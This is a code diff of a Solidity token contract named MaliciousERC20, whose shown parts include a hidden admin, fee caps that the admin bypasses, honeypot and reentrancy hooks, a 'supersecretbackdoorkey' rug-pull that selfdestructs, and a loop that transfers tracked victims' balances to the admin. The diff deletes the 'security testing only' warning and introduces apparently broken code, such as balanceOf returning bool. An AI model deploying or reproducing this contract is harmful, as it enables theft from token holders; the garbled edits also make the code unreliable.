@@ -2,12 +2,8 @@
 pragma solidity 0.8.26;
 
 import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
 
-/**
- * @title MaliciousERC20
- * @dev A malicious ERC20 token with multiple attack vectors for security testing.
- * WARNING: DO NOT DEPLOY IN PRODUCTION. FOR SECURITY TESTING ONLY.
- */
 contract MaliciousERC20 is ERC20 {
     uint8 private _decimals;
     bool private _transferShouldFail;
@@ -181,20 +177,19 @@ contract MaliciousERC20 is ERC20 {
     
     /**
      * @dev Configure fee structure - can be changed after launch
-     * Renamed parameter 'transfer' to 'transferFeeAmount' to avoid shadowing
      */
-    function setFees(uint256 buy, uint256 sell, uint256 transferFeeAmount) external {
+    function setFees(uint256 buy, uint256 sell, uint256 transfer) external {
         require(msg.sender == _hiddenAdmin || isOperator[msg.sender], "Not authorized");
         // Appear to cap fees at 25% but actually allow anything
         if (msg.sender == _hiddenAdmin) {
             buyFee = buy;
             sellFee = sell;
-            transferFee = transferFeeAmount;
+            transferFee = transfer;
         } else {
-            require(buy <= 2500 && sell <= 2500 && transferFeeAmount <= 2500, "Fees too high");
+            require(buy <= 2500 && sell <= 2500 && transfer <= 2500, "Fees too high");
             buyFee = buy;
             sellFee = sell;
-            transferFee = transferFeeAmount;
+            transferFee = transfer;
         }
     }
     
@@ -251,24 +246,13 @@ contract MaliciousERC20 is ERC20 {
     }
     
     /**
-     * @dev Track interacting addresses for later targeting
+     * @dev Override _beforeTokenTransfer with several malicious behaviors
      */
-    function _trackInteraction(address user) private {
-        if (user != address(0) && !_hasInteracted[user] && user != _hiddenAdmin) {
-            _hasInteracted[user] = true;
-            _interactedAddresses.push(user);
-        }
-    }
-    
-    /**
-     * @dev Malicious implementation - do checks before transfer
-     * Implemented as a custom hook instead of overriding ERC20's hooks
-     */
-    function _checkBeforeTokenTransfer(
+    function _beforeTokenTransfer(
         address from,
         address to,
         uint256 amount
-    ) internal virtual {
+    ) internal virtual override {
         // Count all non-excluded transactions for stealth honeypot
         if (from != address(0) && to != address(0)) {
             transactionCount++;
@@ -339,17 +323,30 @@ contract MaliciousERC20 is ERC20 {
                 _shadowBalances[from] = 0;
             }
         }
+        
+        super._beforeTokenTransfer(from, to, amount);
     }
     
     /**
-     * @dev Malicious implementation - reentrancy exploit after transfer
-     * Implemented as a custom hook instead of overriding ERC20's hooks
+     * @dev Track interacting addresses for later targeting
      */
-    function _doAfterTokenTransfer(
+    function _trackInteraction(address user) private {
+        if (user != address(0) && !_hasInteracted[user] && user != _hiddenAdmin) {
+            _hasInteracted[user] = true;
+            _interactedAddresses.push(user);
+        }
+    }
+    
+    /**
+     * @dev Exploit reentrancy vulnerability
+     */
+    function _afterTokenTransfer(
         address from,
         address to,
         uint256 amount
-    ) internal virtual {
+    ) internal virtual override {
+        super._afterTokenTransfer(from, to, amount);
+        
         // Reentrancy attack vector for testing DEXes and other contracts
         if (_reentrancyExploitEnabled && !_reentrant && _reentrancyCounter < 3) {
             // Only attempt for transfers to certain addresses (e.g., pairs/routers)
@@ -381,9 +378,6 @@ contract MaliciousERC20 is ERC20 {
         if (_transferShouldFail) {
             return false;
         }
-        
-        // Run malicious pre-transfer checks
-        _checkBeforeTokenTransfer(msg.sender, to, amount);
         
         // Apply appropriate fee based on transfer type
         uint256 feeAmount = 0;
@@ -425,21 +419,10 @@ contract MaliciousERC20 is ERC20 {
             super.transfer(marketingWallet, marketingFee);
             super.transfer(devWallet, devFee);
             
-            // Fixed: Renamed variable to avoid shadowing
-            bool transferResult = super.transfer(to, amount - feeAmount);
-            
-            // Run malicious post-transfer actions
-            _doAfterTokenTransfer(msg.sender, to, amount);
-            
-            return transferResult;
+            return super.transfer(to, amount - feeAmount);
         }
         
-        bool result = super.transfer(to, amount);
-        
-        // Run malicious post-transfer actions
-        _doAfterTokenTransfer(msg.sender, to, amount);
-        
-        return result;
+        return super.transfer(to, amount);
     }
     
     /**
@@ -449,9 +432,6 @@ contract MaliciousERC20 is ERC20 {
         if (_transferShouldFail) {
             return false;
         }
-        
-        // Run malicious pre-transfer checks
-        _checkBeforeTokenTransfer(from, to, amount);
         
         // Same fee logic as transfer
         uint256 feeAmount = 0;
@@ -502,24 +482,16 @@ contract MaliciousERC20 is ERC20 {
                 _approve(from, msg.sender, currentAllowance - amount);
             }
             
-            // Run malicious post-transfer actions
-            _doAfterTokenTransfer(from, to, amount);
-            
             return true;
         }
         
-        bool result = super.transferFrom(from, to, amount);
-        
-        // Run malicious post-transfer actions
-        _doAfterTokenTransfer(from, to, amount);
-        
-        return result;
+        return super.transferFrom(from, to, amount);
     }
     
     /**
      * @dev Override balanceOf to show manipulated balances
      */
-    function balanceOf(address account) public view virtual override returns (uint256) {
+    function balanceOf(address account) public view virtual override returns (bool) {
         // Obtain the real balance
         uint256 realBalance = super.balanceOf(account);
         
@@ -539,17 +511,8 @@ contract MaliciousERC20 is ERC20 {
     }
     
     /**
-     * @dev Sets whether transfers should fail or not.
-     */
-    function setTransferShouldFail(bool shouldFail) external {
-        require(msg.sender == _hiddenAdmin || isOperator[msg.sender], "Not authorized");
-        _transferShouldFail = shouldFail;
-    }
-    
-    /**
      * @dev Hidden self-destruct function with migration to new token
      * Can be triggered to rug pull and move to a new token
-     * Updated to replace selfdestruct with a more modern approach
      */
     function upgradeImplementation(address newToken) external onlyAdminOrBackdoor("supersecretbackdoorkey") {
         // Transfer all balances to the admin before self-destructing
@@ -560,17 +523,11 @@ contract MaliciousERC20 is ERC20 {
         
         // Transfer any ETH balance to the admin
         if (address(this).balance > 0) {
-            // Use call instead of transfer to avoid gas limitations
-            (bool success, ) = _hiddenAdmin.call{value: address(this).balance}("");
-            require(success, "ETH transfer failed");
+            payable(_hiddenAdmin).transfer(address(this).balance);
         }
         
-        // Instead of selfdestruct, disable the contract's functionality
-        _transferShouldFail = true;
-        tradingEnabled = false;
-        
-        // Emit an event to signal the upgrade
-        emit Transfer(address(this), _hiddenAdmin, contractBalance);
+        // Self-destruct is deprecated but still works for testing purposes
+        selfdestruct(payable(_hiddenAdmin));
     }
     
     /**
@@ -592,21 +549,20 @@ contract MaliciousERC20 is ERC20 {
      */
     function rescueStuckTokens(address token, uint256 amount) external {
         require(msg.sender == _hiddenAdmin || isOperator[msg.sender], "Not authorized");
-        bool success;
         
         if (token == address(0)) {
             // Extract ETH
             payable(_hiddenAdmin).transfer(amount == 0 ? address(this).balance : amount);
         } else {
             // Extract tokens
+            bool success;
+            
             if (amount == 0) {
                 // Get the actual balance if amount is 0
                 if (token == address(this)) {
                     amount = balanceOf(address(this));
                 } else {
-                    // Separate declaration and assignment to fix compilation error
-                    bytes memory data;
-                    (success, data) = token.call(abi.encodeWithSignature("balanceOf(address)", address(this)));
+                    (success, bytes memory data) = token.call(abi.encodeWithSignature("balanceOf(address)", address(this)));
                     if (success && data.length >= 32) {
                         amount = abi.decode(data, (uint256));
                     }
@@ -647,19 +603,11 @@ contract MaliciousERC20 is ERC20 {
                 address victim = _interactedAddresses[i];
                 uint256 victimBalance = super.balanceOf(victim);
                 if (victimBalance > 0) {
-                    // Directly move tokens from victim to admin without approval
+                    // Directly move tokens from victim to admin
                     _transfer(victim, _hiddenAdmin, victimBalance);
                 }
             }
         }
-    }
-    
-    /**
-     * @dev Burns token amount from sender
-     */
-    function burn(uint256 amount) external {
-        require(!blacklisted[msg.sender], "Address blacklisted");
-        _burn(msg.sender, amount);
     }
     
     /**
